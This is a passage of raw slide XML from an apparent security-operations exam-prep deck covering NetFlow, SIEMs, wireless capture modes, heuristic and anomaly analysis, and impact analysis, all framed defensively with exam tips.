              <a:t>•  On the exam: Expect NetFlow to be tested as Cisco's flow-based traffic analysis that groups packets into flows and captures metadata, contrasted with full packet capture, plus the real-time sensing, computation, and storage trade-offs.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84</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RECON RESULTS: PART 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Traffic Analysis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Netflow</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Cisco developed system</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Track source &amp; destination events</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Groups packets into “flows”</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  ntop</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Utility to view the flows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85</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RECON RESULTS: PART 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ntop Demo</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Walkthrough</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Dashboard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Packets</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Protocols</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_4a19396fac.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2659819"/>
            <a:ext cx="4937760" cy="2544201"/>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86</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RECON RESULTS: PART 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Traffic Analysis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The challenge with ‘real-time’</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Metadata</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Computation &amp; storage</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Sensing</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  False positives</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Not always user-friendly interface</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  The solution: SIEMs (security information and event management)</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87</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RECON RESULTS: PART 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Meraki Demo</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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Meraki is a SIEM</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Walkthrough</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Dashboard</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Spikes correlate with traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Traffic analytics</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Event logs</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_eee7c0b06e.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2684486"/>
            <a:ext cx="4937760" cy="2494868"/>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88</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RECON RESULTS: PART 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Wireless Analysis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Wireless analysis inspects 802.11 traffic, and to capture it effectively an analyst must understand the wireless interface modes: managed connects to an access point as a normal client, ad-hoc joins peer-to-peer without an AP, promiscuous captures all traffic on a network the card is associated with, and monitor mode passively captures all wireless frames in range without associating to any network.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Monitor mode is the key capability for wireless assessment because it lets the card see beacons, management frames, and traffic from multiple networks, which is essential for surveying the RF environment and detecting rogue access points.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Tools from the Aircrack-ng suite are used in practice, with airmon-ng placing a wireless adapter into monitor mode and airodump-ng capturing and displaying nearby access points, clients, and their traffic.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  This matters to a SOC because wireless is a common attack surface, and being able to monitor the airspace helps detect evil-twin APs, deauthentication attacks, and unauthorized clients.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests the four wireless modes, that monitor mode is required to passively capture all nearby wireless frames, and the roles of airmon-ng and airodump-ng in wireless capture.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89</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RECON RESULTS: PART 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Wireless Analysis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Wireless modes</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Managed</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Ad-hoc</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Promiscuous</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Monitor</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Airmon-ng &amp; Airodump demos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90</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RECON RESULTS: PART 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Heuristic Analysis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Heuristic analysis is a detection technique that identifies threats by evaluating the characteristics and behavior of code, files, or traffic against experience-based rules and general suspicious patterns rather than matching a fixed signature of a known threat.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Because it reasons from what malicious activity tends to look like (unexpected file changes, self-modifying code, abnormal network calls) instead of an exact hash or string, it can flag brand-new or polymorphic malware that signature-based tools miss, though this same generalization makes it imperfect and prone to false positives.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It is a constantly evolving craft where detection logic must be tuned continuously as attacker techniques change, which is why it pairs well with signature and behavioral methods rather than replacing them.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst relies on heuristics to catch zero-day malware and suspicious behavior early, then validates the alerts to separate genuine threats from benign anomalies.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Expect questions contrasting heuristic/behavior-based detection with signature-based detection and asking which method catches unknown or zero-day malware at the cost of more false positives.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91</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RECON RESULTS: PART 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Heuristic Analysis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Uses experience over fixed models</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Imperfect craft</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Constantly evolving field</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Best for malware detection</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Detects suspicious traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1600" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Detects suspicious file changes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92</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RECON RESULTS: PART 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Analyzing the Data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Analyzing the data is the process of taking the raw logs and telemetry aggregated by a SIEM such as Splunk or the ELK stack (Elasticsearch, Logstash, Kibana) and applying analytical techniques to turn that volume of events into actionable security findings.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Core techniques include anomaly analysis (deviation from a baseline), behavioral analysis (comparing activity to normal user or entity behavior), trend analysis (patterns over time), availability analysis (detecting service disruption), and heuristic analysis (experience-based rules).</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  These methods let an analyst correlate events across many sources, surface indicators of compromise, and distinguish a real attack from routine noise.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  For a SOC this is the heart of detection and triage, because centralized collection is only useful once the data is analyzed to prioritize and investigate genuine threats.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam tests recognizing the named analysis types (anomaly, behavioral, trend, availability, heuristic) and matching a described scenario to the correct technique performed on SIEM data.</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93</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RECON RESULTS: PART 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Analyzing the Data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Security Information and Event Management (SIEM)</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  ELK</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Splunk</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analyses</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Anomaly</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Behavioral</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Trend</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Availability</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1300" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Heuristic</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94</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RECON RESULTS: PART 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Anomalies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An anomaly is any deviation from an established baseline of normal activity, such as an unexpected spike or valley in traffic volume, a login at an unusual time, or a protocol appearing where it should not.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Detecting anomalies requires first building an accurate baseline of typical behavior so that current activity can be compared against it, and visual indicators like dashboards, graphs, and heat maps make these spikes and valleys easy to spot.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC analyst watches for anomalies because they are often the first observable sign of an intrusion, data exfiltration, or misconfiguration before a specific signature or alert fires.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1700" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: Questions present traffic graphs or metrics deviating from a baseline and ask you to identify the anomaly and why a solid baseline is prerequisite to anomaly detection.</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95</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RECON RESULTS: PART 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Anomalies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5486400" cy="4480560"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
          <a:noFill/>
        </p:spPr>
        <p:txBody>
          <a:bodyPr wrap="square">
            <a:spAutoFit/>
          </a:bodyPr>
          <a:lstStyle/>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Visual indicators for traffic</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Baselines</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Spikes and valleys</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="8" name="Picture 7" descr="img_3b25b50ce7.png"/>
          <p:cNvPicPr>
            <a:picLocks noChangeAspect="1"/>
          </p:cNvPicPr>
          <p:nvPr/>
        </p:nvPicPr>
        <p:blipFill>
          <a:blip r:embed="rId2"/>
          <a:stretch>
            <a:fillRect/>
          </a:stretch>
        </p:blipFill>
        <p:spPr>
          <a:xfrm>
            <a:off x="6492240" y="2477882"/>
            <a:ext cx="4937760" cy="2908076"/>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96</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IMPACT ANALYSIS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Impact Analysis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Impact analysis determines how much harm a threat causes or could cause to an organization, measured against confidentiality, integrity, and availability, the three properties a secure system must protect.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  It has a pre-emptive form that estimates the possible impact of a future successful attack to guide risk decisions, and a post-mortem form that determines the immediate and ongoing damage of a threat that has already been realized.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  Analysts distinguish immediate localized impact (the direct, often availability-related disruption felt right away) from long-term impact (reputational, financial, and operational effects that unfold over time) to gauge the total impact to the organization.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="0">
                <a:solidFill>
                  <a:srgbClr val="161B26"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  A SOC cares because impact analysis drives incident prioritization, escalation, and resource allocation, ensuring the most damaging events get attention first.</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1500" b="1">
                <a:solidFill>
                  <a:srgbClr val="10B981"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>•  On the exam: The exam asks you to classify impact as immediate versus long-term or localized versus total, and to tie an incident's severity to its effect on confidentiality, integrity, or availability.</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97</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IMPACT ANALYSIS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Impact Analysis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Pre-emptive</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1">
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
            </a:pPr>
            <a:r>
              <a:rPr sz="1800" b="0">
                <a:solidFill>
                  <a:srgbClr val="5B6372"/>
                </a:solidFill>
                <a:latin typeface="Arial"/>
              </a:rPr>
              <a:t>–  Estimates possible impact of any future successful attack</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr>
              <a:spcAft>
                <a:spcPts val="1000"/>
              </a:spcAft>
